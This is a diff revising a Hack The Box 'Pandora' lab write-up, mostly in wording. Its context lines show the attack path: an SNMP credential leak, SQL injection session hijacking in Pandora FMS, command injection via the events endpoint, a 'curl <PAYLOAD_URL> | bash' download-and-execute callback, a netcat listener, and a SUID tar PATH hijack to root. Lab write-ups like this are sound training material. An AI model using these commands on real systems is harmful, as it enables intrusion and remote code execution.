@@ -40,7 +40,7 @@ outcome: "SSH shell as the initial account, Pandora FMS session hijacking and ap
 
 ## From SNMP leak to SUID tar hijack
 
-Pandora is an Easy-rated Hack The Box Linux lab whose path begins with UDP enumeration: an SNMP walk using the default community string exposes a cleartext host-check credential for `<INITIAL_ACCESS_ACCOUNT>`, which grants SSH access. From that shell, an Apache virtual-host configuration reveals a Pandora FMS instance bound to localhost; an SSH dynamic forward exposes it, and a SQL injection in `chart_generator.php` dumps a live session that authenticates as `<APPLICATION_ACCOUNT>`. An authenticated command-execution flaw in the Events AJAX endpoint yields a shell as that account, and a SUID backup binary that calls `tar` by relative name allows PATH hijacking to root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). Several transitions — the virtual-host disclosure, the session-table dump, and the confirmed command execution — were documented without retained terminal output and are stated as recorded.
+Pandora is an Easy-rated Hack The Box Linux lab whose path begins with UDP enumeration: an SNMP walk using the default community string exposes a cleartext host-check credential for `<INITIAL_ACCESS_ACCOUNT>`, which grants SSH access. From that shell, an Apache virtual-host configuration reveals a Pandora FMS instance bound to localhost; an SSH dynamic forward exposes it, and a SQL injection in `chart_generator.php` dumps a live session that authenticates as `<APPLICATION_ACCOUNT>`. An authenticated command-execution flaw in the Events AJAX endpoint yields a shell as that account, and a SUID backup binary that calls `tar` by relative name allows PATH hijacking to root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/). Several transitions (the virtual-host disclosure, the session-table dump, and the confirmed command execution) were documented without retained terminal output; I could not verify them against captured output and state them as recorded.
 
 **Attack path:** **SNMP community-string enumeration → cleartext SSH credential → internal Pandora FMS discovery → SQL injection session hijacking → authenticated command execution → SUID `tar` PATH hijacking → root**
 
@@ -50,7 +50,7 @@ Pandora is an Easy-rated Hack The Box Linux lab whose path begins with UDP enume
 - **Web front end:** identifies itself as `<TARGET_HOST>`, so a local hosts-file entry is required to browse by name.
 - **Starting position:** unauthenticated network access, with no provided credentials.
 - **Objective:** enumerate the attack surface, pivot through an internal monitoring application, and escalate to root.
-- **Constraints:** activity was confined to the Hack The Box lab environment.
+- **Constraints:** all activity stayed inside the Hack The Box lab environment.
 
 ## Evidence: SNMP credential to SUID tar PATH
 
@@ -77,7 +77,7 @@ feroxbuster --url http://<TARGET_IP> --wordlist <WEB_CONTENT_WORDLIST>
 
 ### 2. UDP Scanning and SNMP Credential Leak
 
-Observation: because the TCP surface is small, UDP scanning is used and reveals SNMP.
+Observation: with only two TCP services exposed, UDP scanning reveals SNMP.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sU -sC -sV -oN <SCAN_OUTPUT>
@@ -116,7 +116,7 @@ ssh <INITIAL_ACCESS_ACCOUNT>@<TARGET_IP>
 <INITIAL_ACCESS_ACCOUNT>
 ```
 
-Significance: the credential leaked by SNMP authenticates over SSH, turning network enumeration into a shell.
+Significance: the credential leaked by SNMP authenticates over SSH, so network enumeration becomes a shell.
 
 Result: a user-level shell as `<INITIAL_ACCESS_ACCOUNT>`; because the user flag belongs to `<APPLICATION_ACCOUNT>`, lateral movement is required.
 
@@ -146,7 +146,7 @@ Significance: this version is affected by the `chart_generator.php` SQL injectio
 
 Result: the deployed version is identified as a vulnerable Pandora FMS build.
 
-### 5. Pandora FMS SQL Injection — Session Hijacking
+### 5. Pandora FMS SQL Injection: Session Hijacking
 
 Observation: `chart_generator.php` is injectable through the `session_id` parameter on the disclosed version.
 
@@ -177,9 +177,9 @@ Cookie: PHPSESSID=<APPLICATION_SESSION_ID>
 page=include/ajax/events&perform_event_response=10000000&target=whoami
 ```
 
-Significance: the response returned the command output, confirming that the application executes the supplied `target` value as `<APPLICATION_ACCOUNT>`.
+Significance: the response returned the command output, which confirms that the application executes the supplied `target` value as `<APPLICATION_ACCOUNT>`.
 
-Result: authenticated command execution as the web application account. An interactive shell was then obtained through a download-and-execute callback issued via the same primitive:
+Result: authenticated command execution as the web application account. I then obtained an interactive shell through a download-and-execute callback issued via the same primitive:
 
 ```text
 target=curl <PAYLOAD_URL> | bash
@@ -210,9 +210,9 @@ ls -la /usr/bin/pandora_backup
 -rwsr-x--- 1 root <APPLICATION_ACCOUNT> ... /usr/bin/pandora_backup
 ```
 
-Significance: the binary runs with the setuid bit owned by root and is executable by the application account's group, making it the local escalation target.
+Significance: the binary runs with the setuid bit owned by root and is executable by the application account's group, so it is the local escalation target.
 
-Result: a setuid-root backup utility is exposed to the current shell. The binary was copied off the host for analysis; inspecting its embedded strings shows how it invokes a dependency:
+Result: a setuid-root backup utility is exposed to the current shell. I copied the binary off the host for analysis and checked its embedded strings to see how it invokes a dependency:
 
 ```bash
 strings <BINARY>
@@ -242,7 +242,7 @@ nc -nlvp <LISTEN_PORT>
 root
 ```
 
-Result: the privileged context executes the substituted `tar`, returning a root shell.
+Result: the privileged context executes the substituted `tar` and returns a root shell.
 
 ## No TCP path, a loopback service, and a relative tar call
 
